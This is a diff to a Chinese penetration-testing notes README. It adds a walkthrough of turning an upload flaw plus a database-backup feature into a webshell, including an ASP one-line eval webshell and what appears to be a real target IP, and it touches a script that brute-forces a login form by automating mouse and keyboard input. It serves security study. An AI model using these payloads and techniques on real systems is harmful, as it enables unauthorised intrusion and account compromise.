@@ -1,3 +1,20 @@
+- [🚩 未授权文件上传 -> 获取OAuth凭证 -> 获取敏感信息](https://github.com/reidmu/sec-note/edit/main/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/README.md#-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0---%E8%8E%B7%E5%8F%96oauth%E5%87%AD%E8%AF%81---%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF)
+- [🚩 企业微信管理后台密钥泄露利用](https://github.com/reidmu/sec-note/edit/main/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/README.md#-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8)
+- [🚩 打点 - SQL注入 + XSS -> getshell](https://github.com/reidmu/sec-note/edit/main/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/README.md#-%E6%89%93%E7%82%B9---sql%E6%B3%A8%E5%85%A5--xss---getshell)
+- [🚩 打点 - 任意文件读取->暴破.bash_history](https://github.com/reidmu/sec-note/edit/main/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/README.md#-%E6%89%93%E7%82%B9---%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E6%9A%B4%E7%A0%B4bash_history)
+- [🚩 打点-文件下载/信息收集 mlocate.db](https://github.com/reidmu/sec-note/edit/main/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/README.md#-%E6%89%93%E7%82%B9-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-mlocatedb)
+- [🚩 打点 - 登录框无法破解加密算法 -> py脚本控制重复发包](https://github.com/reidmu/sec-note/edit/main/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/README.md#-%E6%89%93%E7%82%B9---%E6%97%A0%E6%B3%95%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95---py%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6%E9%87%8D%E5%A4%8D%E5%8F%91%E5%8C%85)
+
+
+
+
+
+
+
+
+
+
+
 ## 🚩 未授权文件上传 -> 获取OAuth凭证 -> 获取敏感信息
 - 网站页面看到新的图标和名称 -> 猜测是小程序、公众号或APP，最后关键字搜索找到是某小程序 -> 小程序反编译，得到API接口信息。
 
@@ -123,13 +140,13 @@ root@pentest:~# mlocate -d mlocate.db -r ".*\.conf"
 
 实战中可以搜索`.env`、`.conf`一类的文件，甚至搜索源代码路径，遍历下载源代码进行审计。
 
-## 🚩 打点 - 重复发包
+## 🚩 打点 - 登录框无法破解加密算法 -> py脚本控制重复发包
 因为存在一些无法破解的加密算法，无法用burp直接重复发包，所以使用脚本控制鼠标和键盘代替手工点击和输入。
 - mouse.py
 ```
 # -*- coding: utf-8 -*-
 '''
-无法重复发包时，通过脚本控制鼠标键盘遍历工号重复发包（代替手工）
+无法重复发包时，通过脚本控制鼠标键盘遍历用户名重复发包（代替手工）
 '''
 import pyautogui
 import pyautogui as pg 
@@ -155,5 +172,37 @@ with open( 'pass.txt', 'r' ) as f1:
 ```
 
 
+## 打点-数据库备份 -> getshell
+- 整体利用思路
+  - 编辑器上传`.JPG`图片马 -> 利用数据库备份功能将`.JPG`木马备份成`.asp`木马 -> getshell
 
+- 编辑器上传图片马
+  - 前端绕过：前端限制上传类型，图片码写入asp一句话 `<%eval request("test")%>` ，将文件名改成`tete.asp.JPG`上传
+  - 成功上传，并返回了图片保存路径：`editor\/aaaa\/bbbb\/1234.jpg`
+  - 拼接路径访问`http://ip/editor/aaaa/bbbb/1234.jpg`存在，说明`editor`在网站物理根路径下
+
+- 发现备份数据文件功能，备份的源路径、目的路径和文件名可控
+  
+  <div align=center><img src="https://user-images.githubusercontent.com/84888757/174441521-55f11f96-ffc5-4fe2-bb56-67c01cc0c0af.png" /></div>
+
+- 找寻根路径
+  - 向上遍历当前数据库物理路径`data`，`http://ip/data` 返回403响应，说明存在`data`网站url
+  - 继续向上遍历当前数据库物理路径`ksystem`，`http://ip/ksystem` 返回404响应，说明它不在对外开放的网站url下，可能是网站物理根路径
+  - 访问备份数据库目录`beidir`， `http://ip/beidir` 返回403响应，说明存在`beidir`网站url
+
+> tips：判断路径`a`是否存在，可以访问 http://xx.com/a ，即使浏览器返回页面为空，但路径会自动添加/，变成http://xx.com/a/ ，那么`a`路径很可能存在。
+
+- 利用数据库备份功能将`.JPG`木马备份成`.asp`木马
+  - 将当前数据库路径设置成：`.JPG`木马上传后得到的路径 `D:\xxx\ksystem\data\editor\aaaa\bbbb\1234.jpg`
+  - 将备份数据库的文件名后缀改成可解析的备份文件名`1234.asp`
+  - 进行备份，提示备份成功
+  - 连接http://xxx.com/备份文件路径/备份文件名.asp ，即 `http://8.142.126.47/beidir/muma.asp`
+
+
+<div align=center><img src="https://user-images.githubusercontent.com/84888757/174442064-fd20704c-d577-4911-879f-e3333f4fc99f.png" /></div>
+
+- 这里给出几个网上的例子
+  - [Cookie注入漏洞 + 数据库备份 -> getshell](https://blog.csdn.net/weixin_40412037/article/details/112193916)
+  - [数据库备份(f12更改源路径和目的路径) -> getshell](https://blog.csdn.net/weixin_34712106/article/details/113654555)
+  - [后台备份数据库getshell(注意路径问题)](https://blog.51cto.com/u_15067230/4223667)
 
